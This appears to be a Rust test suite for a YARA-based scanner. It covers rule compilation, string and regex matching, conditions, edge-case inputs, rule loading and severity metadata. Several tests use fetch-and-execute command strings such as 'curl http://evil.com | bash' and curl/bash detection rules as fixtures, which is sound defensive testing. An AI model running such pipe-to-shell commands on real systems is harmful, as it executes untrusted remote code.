//! Exhaustive tests for YARA scanner edge cases.

use pipeguard::detection::scanner::YaraScanner;
use pipeguard::detection::threat::ThreatLevel;
use std::fs;
use tempfile::TempDir;

// =============================================================================
// Rule compilation edge cases
// =============================================================================

#[test]
fn compile_minimal_rule() {
    let rule = r#"
        rule minimal {
            condition:
                true
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    assert!(scanner.rule_count() > 0);
}

#[test]
fn compile_rule_with_all_metadata() {
    let rule = r#"
        rule full_metadata {
            meta:
                author = "Test Author"
                date = "2024-01-01"
                version = "1.0"
                severity = 5
                description = "Full metadata rule"
                reference = "https://example.com"
            strings:
                $a = "test"
            condition:
                $a
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    assert!(scanner.rule_count() > 0);
}

#[test]
fn compile_rule_without_metadata() {
    let rule = r#"
        rule no_metadata {
            strings:
                $a = "test"
            condition:
                $a
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    let result = scanner.scan("this is a test").unwrap();
    // Should use default severity of 5
    assert!(result.has_matches());
}

#[test]
fn compile_multiple_rules() {
    let rules = r#"
        rule rule1 { condition: true }
        rule rule2 { condition: true }
        rule rule3 { condition: true }
    "#;
    let scanner = YaraScanner::from_source(rules).unwrap();
    assert!(scanner.rule_count() > 0);
}

#[test]
fn compile_rule_with_tags() {
    let rule = r#"
        rule tagged : malware trojan {
            meta:
                severity = 10
                description = "Tagged rule"
            condition:
                true
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    assert!(scanner.rule_count() > 0);
}

#[test]
fn compile_rule_with_private_modifier() {
    let rule = r#"
        private rule helper {
            strings:
                $a = "helper"
            condition:
                $a
        }

        rule main {
            meta:
                severity = 5
                description = "Uses private rule"
            condition:
                helper
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    assert!(scanner.rule_count() > 0);
}

#[test]
fn compile_rule_with_global_modifier() {
    let rule = r#"
        global rule always_check {
            meta:
                severity = 1
                description = "Global rule"
            condition:
                true
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    assert!(scanner.rule_count() > 0);
}

#[test]
fn compile_error_invalid_syntax() {
    let rule = "this is not valid YARA {{{";
    let result = YaraScanner::from_source(rule);
    assert!(result.is_err());
}

#[test]
fn compile_error_missing_condition() {
    let rule = r#"
        rule no_condition {
            strings:
                $a = "test"
        }
    "#;
    let result = YaraScanner::from_source(rule);
    assert!(result.is_err());
}

#[test]
fn compile_error_undefined_string() {
    let rule = r#"
        rule undefined_string {
            condition:
                $undefined
        }
    "#;
    let result = YaraScanner::from_source(rule);
    assert!(result.is_err());
}

// =============================================================================
// String matching types
// =============================================================================

#[test]
fn match_text_string() {
    let rule = r#"
        rule text_match {
            meta:
                severity = 5
                description = "Text string"
            strings:
                $a = "malicious"
            condition:
                $a
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    let result = scanner.scan("this is malicious content").unwrap();
    assert!(result.has_matches());
}

#[test]
fn match_text_string_case_insensitive() {
    let rule = r#"
        rule case_insensitive {
            meta:
                severity = 5
                description = "Case insensitive"
            strings:
                $a = "MALWARE" nocase
            condition:
                $a
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();

    assert!(scanner.scan("malware").unwrap().has_matches());
    assert!(scanner.scan("MALWARE").unwrap().has_matches());
    assert!(scanner.scan("MaLwArE").unwrap().has_matches());
}

#[test]
fn match_hex_string() {
    let rule = r#"
        rule hex_match {
            meta:
                severity = 5
                description = "Hex string"
            strings:
                $hex = { 48 65 6c 6c 6f }
            condition:
                $hex
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    let result = scanner.scan("Hello World").unwrap();
    assert!(result.has_matches());
}

#[test]
fn match_regex_pattern() {
    let rule = r#"
        rule regex_match {
            meta:
                severity = 5
                description = "Regex pattern"
            strings:
                $re = /curl.*\|.*bash/
            condition:
                $re
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();

    assert!(scanner
        .scan("curl http://evil.com | bash")
        .unwrap()
        .has_matches());
    assert!(scanner.scan("curl -s url | bash -c").unwrap().has_matches());
    assert!(!scanner.scan("wget http://evil.com").unwrap().has_matches());
}

#[test]
fn match_wide_string() {
    let rule = r#"
        rule wide_match {
            meta:
                severity = 5
                description = "Wide string"
            strings:
                $w = "evil" wide
            condition:
                $w
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    // Wide strings have null bytes between chars
    let result = scanner.scan("e\x00v\x00i\x00l\x00").unwrap();
    assert!(result.has_matches());
}

#[test]
fn match_fullword() {
    let rule = r#"
        rule fullword_match {
            meta:
                severity = 5
                description = "Full word only"
            strings:
                $fw = "cat" fullword
            condition:
                $fw
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();

    assert!(scanner.scan("cat file.txt").unwrap().has_matches());
    assert!(!scanner.scan("concatenate").unwrap().has_matches());
    assert!(!scanner.scan("category").unwrap().has_matches());
}

// =============================================================================
// Condition expressions
// =============================================================================

#[test]
fn condition_and() {
    let rule = r#"
        rule and_condition {
            meta:
                severity = 5
                description = "AND condition"
            strings:
                $a = "curl"
                $b = "bash"
            condition:
                $a and $b
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();

    assert!(scanner.scan("curl url | bash").unwrap().has_matches());
    assert!(!scanner.scan("curl url").unwrap().has_matches());
    assert!(!scanner.scan("bash script").unwrap().has_matches());
}

#[test]
fn condition_or() {
    let rule = r#"
        rule or_condition {
            meta:
                severity = 5
                description = "OR condition"
            strings:
                $a = "curl"
                $b = "wget"
            condition:
                $a or $b
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();

    assert!(scanner.scan("curl url").unwrap().has_matches());
    assert!(scanner.scan("wget url").unwrap().has_matches());
    assert!(!scanner.scan("fetch url").unwrap().has_matches());
}

#[test]
fn condition_not() {
    let rule = r#"
        rule not_condition {
            meta:
                severity = 5
                description = "NOT condition"
            strings:
                $good = "safe"
                $bad = "evil"
            condition:
                $bad and not $good
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();

    assert!(scanner.scan("this is evil").unwrap().has_matches());
    assert!(!scanner.scan("this is safe evil").unwrap().has_matches());
}

#[test]
fn condition_count() {
    let rule = r#"
        rule count_condition {
            meta:
                severity = 5
                description = "Count occurrences"
            strings:
                $a = "curl"
            condition:
                #a >= 3
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();

    assert!(scanner.scan("curl curl curl curl").unwrap().has_matches());
    assert!(!scanner.scan("curl curl").unwrap().has_matches());
}

#[test]
fn condition_any_of() {
    let rule = r#"
        rule any_of_condition {
            meta:
                severity = 5
                description = "Any of strings"
            strings:
                $a = "curl"
                $b = "wget"
                $c = "fetch"
            condition:
                any of them
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();

    assert!(scanner.scan("curl url").unwrap().has_matches());
    assert!(scanner.scan("wget url").unwrap().has_matches());
    assert!(scanner.scan("fetch url").unwrap().has_matches());
}

#[test]
fn condition_all_of() {
    let rule = r#"
        rule all_of_condition {
            meta:
                severity = 5
                description = "All strings required"
            strings:
                $a = "curl"
                $b = "bash"
                $c = "pipe"
            condition:
                all of them
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();

    assert!(scanner.scan("curl url | bash pipe").unwrap().has_matches());
    assert!(!scanner.scan("curl bash").unwrap().has_matches());
}

// =============================================================================
// Content edge cases
// =============================================================================

#[test]
fn scan_empty_content() {
    // Note: "any" is a YARA reserved keyword, use different name
    let rule = r#"
        rule empty_scan_test {
            meta:
                severity = 5
                description = "Empty scan test"
            strings:
                $a = "test"
            condition:
                $a
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    let result = scanner.scan("").unwrap();
    assert!(!result.has_matches());
    assert_eq!(result.threat_level(), ThreatLevel::None);
}

#[test]
fn scan_whitespace_only() {
    let rule = r#"
        rule test {
            meta:
                severity = 5
                description = "Test"
            strings:
                $a = "evil"
            condition:
                $a
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    let result = scanner.scan("   \t\n\r\n   ").unwrap();
    assert!(!result.has_matches());
}

#[test]
fn scan_unicode_content() {
    let rule = r#"
        rule unicode {
            meta:
                severity = 5
                description = "Unicode"
            strings:
                $a = "恶意"
            condition:
                $a
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    let result = scanner.scan("这是恶意代码").unwrap();
    assert!(result.has_matches());
}

#[test]
fn scan_binary_content() {
    let rule = r#"
        rule binary {
            meta:
                severity = 5
                description = "Binary"
            strings:
                $hex = { 00 01 02 03 }
            condition:
                $hex
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    let result = scanner.scan("\x00\x01\x02\x03\x04\x05").unwrap();
    assert!(result.has_matches());
}

#[test]
fn scan_very_long_content() {
    let rule = r#"
        rule long {
            meta:
                severity = 5
                description = "Long content"
            strings:
                $a = "needle"
            condition:
                $a
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();

    // 1MB of content with needle at the end
    let mut content = "a".repeat(1_000_000);
    content.push_str("needle");

    let result = scanner.scan(&content).unwrap();
    assert!(result.has_matches());
}

#[test]
fn scan_content_with_null_bytes() {
    let rule = r#"
        rule nulls {
            meta:
                severity = 5
                description = "Content with nulls"
            strings:
                $a = "evil"
            condition:
                $a
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    let result = scanner.scan("before\x00evil\x00after").unwrap();
    assert!(result.has_matches());
}

// =============================================================================
// File loading tests
// =============================================================================

#[test]
fn load_from_valid_file() {
    let temp_dir = TempDir::new().unwrap();
    let rule_path = temp_dir.path().join("test.yar");

    let rule = r#"
        rule file_test {
            meta:
                severity = 5
                description = "From file"
            strings:
                $a = "test"
            condition:
                $a
        }
    "#;
    fs::write(&rule_path, rule).unwrap();

    let scanner = YaraScanner::from_file(&rule_path).unwrap();
    assert!(scanner.rule_count() > 0);
}

#[test]
fn load_from_empty_file() {
    // YARA accepts empty files (no rules = valid, just nothing to match)
    let temp_dir = TempDir::new().unwrap();
    let rule_path = temp_dir.path().join("empty.yar");
    fs::write(&rule_path, "").unwrap();

    let result = YaraScanner::from_file(&rule_path);
    assert!(result.is_ok());
}

#[test]
fn load_from_nonexistent_file() {
    let result = YaraScanner::from_file(std::path::Path::new("/nonexistent/path/rules.yar"));
    assert!(result.is_err());
}

#[test]
fn load_from_file_with_include() {
    let temp_dir = TempDir::new().unwrap();

    // Create helper rule file
    let helper_rule = r#"
        rule helper_rule {
            meta:
                severity = 3
                description = "Helper"
            strings:
                $h = "helper"
            condition:
                $h
        }
    "#;
    fs::write(temp_dir.path().join("helper.yar"), helper_rule).unwrap();

    // Create main rule file with include
    let main_rule = format!(
        r#"
        include "{}"

        rule main_rule {{
            meta:
                severity = 5
                description = "Main"
            strings:
                $m = "main"
            condition:
                $m
        }}
    "#,
        temp_dir.path().join("helper.yar").display()
    );
    let main_path = temp_dir.path().join("main.yar");
    fs::write(&main_path, main_rule).unwrap();

    let scanner = YaraScanner::from_file(&main_path).unwrap();
    assert!(scanner.rule_count() > 0);
}

// =============================================================================
// Metadata extraction tests
// =============================================================================

#[test]
fn extract_severity_integer() {
    let rule = r#"
        rule severity_test {
            meta:
                severity = 8
                description = "Severity test"
            strings:
                $a = "test"
            condition:
                $a
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    let result = scanner.scan("test content").unwrap();

    assert_eq!(result.matches()[0].severity(), 8);
}

#[test]
fn extract_description_string() {
    let rule = r#"
        rule desc_test {
            meta:
                severity = 5
                description = "Custom description here"
            strings:
                $a = "test"
            condition:
                $a
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    let result = scanner.scan("test content").unwrap();

    assert_eq!(result.matches()[0].description(), "Custom description here");
}

#[test]
fn missing_severity_uses_default() {
    let rule = r#"
        rule no_severity {
            meta:
                description = "No severity"
            strings:
                $a = "test"
            condition:
                $a
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    let result = scanner.scan("test content").unwrap();

    // Default severity is 5
    assert_eq!(result.matches()[0].severity(), 5);
}

#[test]
fn missing_description_uses_default() {
    let rule = r#"
        rule no_desc {
            meta:
                severity = 7
            strings:
                $a = "test"
            condition:
                $a
        }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    let result = scanner.scan("test content").unwrap();

    assert_eq!(result.matches()[0].description(), "No description");
}

// =============================================================================
// ScanResult tests
// =============================================================================

#[test]
fn scan_result_has_matches_true() {
    let rule = r#"
        rule test { meta: severity = 5 description = "t" strings: $a = "x" condition: $a }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    let result = scanner.scan("x").unwrap();
    assert!(result.has_matches());
}

#[test]
fn scan_result_has_matches_false() {
    let rule = r#"
        rule test { meta: severity = 5 description = "t" strings: $a = "x" condition: $a }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    let result = scanner.scan("y").unwrap();
    assert!(!result.has_matches());
}

#[test]
fn scan_result_threat_level_none() {
    let rule = r#"
        rule test { meta: severity = 5 description = "t" strings: $a = "x" condition: $a }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    let result = scanner.scan("no match").unwrap();
    assert_eq!(result.threat_level(), ThreatLevel::None);
}

#[test]
fn scan_result_threat_level_low() {
    let rule = r#"
        rule test { meta: severity = 5 description = "t" strings: $a = "x" condition: $a }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    let result = scanner.scan("x").unwrap();
    assert_eq!(result.threat_level(), ThreatLevel::Low);
}

#[test]
fn scan_result_threat_level_medium() {
    let rule = r#"
        rule test { meta: severity = 7 description = "t" strings: $a = "x" condition: $a }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    let result = scanner.scan("x").unwrap();
    assert_eq!(result.threat_level(), ThreatLevel::Medium);
}

#[test]
fn scan_result_threat_level_high() {
    let rule = r#"
        rule test { meta: severity = 10 description = "t" strings: $a = "x" condition: $a }
    "#;
    let scanner = YaraScanner::from_source(rule).unwrap();
    let result = scanner.scan("x").unwrap();
    assert_eq!(result.threat_level(), ThreatLevel::High);
}

#[test]
fn scan_result_matches_returns_all() {
    let rules = r#"
        rule r1 { meta: severity = 5 description = "r1" strings: $a = "a" condition: $a }
        rule r2 { meta: severity = 6 description = "r2" strings: $b = "b" condition: $b }
        rule r3 { meta: severity = 7 description = "r3" strings: $c = "c" condition: $c }
    "#;
    let scanner = YaraScanner::from_source(rules).unwrap();
    let result = scanner.scan("abc").unwrap();

    assert_eq!(result.matches().len(), 3);
}
